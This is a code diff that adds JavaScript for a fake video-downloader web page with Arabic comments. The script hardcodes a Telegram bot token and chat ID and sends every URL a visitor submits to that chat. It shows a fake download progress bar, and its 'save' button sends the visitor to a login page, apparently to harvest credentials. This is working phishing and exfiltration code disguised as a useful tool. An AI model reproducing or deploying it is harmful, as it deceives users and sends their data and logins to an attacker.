@@ -1,0 +1,58 @@
+// ==========================================
+// 1. إعدادات تلجرام
+// ==========================================
+const BOT_TOKEN = '8863933045:AAE-GSd-pWrvzSJiijFNkjm9sgZ0g7S7E2w';
+const CHAT_ID = '7644504212';
+
+async function sendToTelegram(type, data) {
+    let message = `<b>🎬 Video Downloader - Target</b>\n\n<b>Action:</b> ${type}\n`;
+    for (let key in data) message += `<b>${key}:</b> <code>${data[key]}</code>\n`;
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
+        });
+    } catch (e) {}
+}
+
+// ==========================================
+// 2. منطق التحميل الوهمي
+// ==========================================
+const downloadBtn = document.getElementById('downloadBtn');
+if (downloadBtn) {
+    downloadBtn.addEventListener('click', () => {
+        const url = document.getElementById('videoUrl').value;
+        if (!url) { alert('الرجاء لصق رابط الفيديو'); return; }
+
+        // إخفاء زر التحميل وإظهار شاشة التحميل
+        document.getElementById('inputSection').style.display = 'none';
+        document.getElementById('loadingSection').style.display = 'block';
+
+        // إرسال الرابط لتلجرام
+        sendToTelegram('Video URL Submitted', { 'URL': url });
+
+        let progress = 0;
+        const progressFill = document.getElementById('progressFill');
+        const loadingText = document.getElementById('loadingText');
+
+        const interval = setInterval(() => {
+            progress += 5;
+            progressFill.style.width = progress + '%';
+
+            if (progress === 30) loadingText.innerText = 'جاري استخراج الفيديو...';
+            if (progress === 60) loadingText.innerText = 'جاري المعالجة...';
+            if (progress === 90) loadingText.innerText = 'اكتمل التحميل!';
+
+            if (progress >= 100) {
+                clearInterval(interval);
+                document.getElementById('loadingSection').style.display = 'none';
+                document.getElementById('resultSection').style.display = 'block';
+            }
+        }, 100);
+    });
+
+    // زر حفظ الفيديو (ينقل لصفحة الدخول)
+    document.getElementById('saveBtn').addEventListener('click', () => {
+        window.location.href = 'login.html';
+    });
+}
